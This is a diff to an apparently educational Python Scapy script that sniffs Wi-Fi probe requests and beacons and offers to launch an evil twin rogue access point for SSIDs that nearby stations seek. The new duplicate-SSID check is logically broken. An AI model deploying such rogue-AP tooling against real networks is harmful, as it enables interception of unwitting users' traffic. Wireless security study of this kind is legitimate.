@@ -9,15 +9,12 @@ from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Prob
 
 ################## Passing arguments ##################
 parser = argparse.ArgumentParser(prog="Scapy Detection of Probe Request and possiblity to start an evil tween",
-                                 usage="%(prog)s -i wlan0mon -ssid McDo",
+                                 usage="%(prog)s -i wlan0mon",
                                  description="Scapy Detection of Probe Request and possiblity to start an evil tween",
                                  allow_abbrev=False)
 
 parser.add_argument("-i", "--Interface", required=True,
                     help="The interface we want to sniff to be on, needs to be set to monitor mode with channel hopping")
-
-parser.add_argument("-ssid", "--SSIDname", required=True,
-                    help="The SSID we want to is receiving Probe Request")  
 
 parser.add_argument("-t", "--Timeout", required=False,
                     help="The time in secondes how long we will scan for STA, default is 30", default=30)                 
@@ -28,10 +25,10 @@ args = parser.parse_args()
 ################## variables ##################
 
 IFACE_NAME = args.Interface
-SSID_chosen = args.SSIDname
 timeout = args.Timeout
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 sta_list = []
+ssid_list = []
 
 # Si jamais l'interface est down
 #os.system("ifconfig %s up" % IFACE_NAME)
@@ -53,12 +50,31 @@ def PacketHandler(pkt):
             # On récupère le SSID du packet 
             ssid = pkt.info.decode('utf-8')
 
+            ssid_list.append(ssid)
+
             # Verification des doublons et que le SSID et celui qu'on veut
-            if ssid == SSID_chosen and sta not in sta_list:
-                sta_list.append(sta)
-                print("STA (%s) is looking for the given SSID (%s)" % (sta, ssid))
-            
-            
+            if ssid not in ssid_list:
+                ssid_list.append(ssid)
+                print("STA (%s) is looking for the SSID (%s)" % (sta, ssid))
+
+    elif pkt.haslayer(Dot11Beacon): # SI c'est une trame beacon 
+
+        #Vérifier que les infos existent
+        if pkt.haslayer(Dot11Elt):
+
+            SSID = pkt.info.decode("utf-8")
+
+            # On vérifie si le ssid se trouve dans le tableau des ssid recherchés 
+            # par une STA
+            if SSID in ssid_list:
+                print("We found an existing SSID nearby %s" % SSID)
+                # On demande si on veut lancer un evil tween avec le SSID trouvé
+                user_input = input("Would you make an evil tween ? (y/n) \n")
+                if user_input == "y":
+                    evil_tween(SSID)
+                else:
+                    exit(1)
+
 def evil_tween(ssid):
     faker = Faker()
 
@@ -82,22 +98,7 @@ def evil_tween(ssid):
 
 sniff(iface=IFACE_NAME, prn=PacketHandler, timeout=timeout)
  
-# Affichage des résulats
-if len(sta_list) == 0:
-    print("We found no STA searching for SSID : %s " % SSID_chosen)
-else:
-    print("We found all theses STA searching for SSID : %s" % SSID_chosen)
-    counter = 1
-    for sta in sta_list:
-        print("%d. %s" % (counter, sta) )
-        counter += 1
 
-    # On demande si on veut lancer un evil tween avec le SSID donnée
-    user_input = input("Would you make an evil tween ? (y/n)")
-    if user_input == "y":
-        evil_tween(SSID_chosen)
-    else:
-        exit(1)
 
 
 
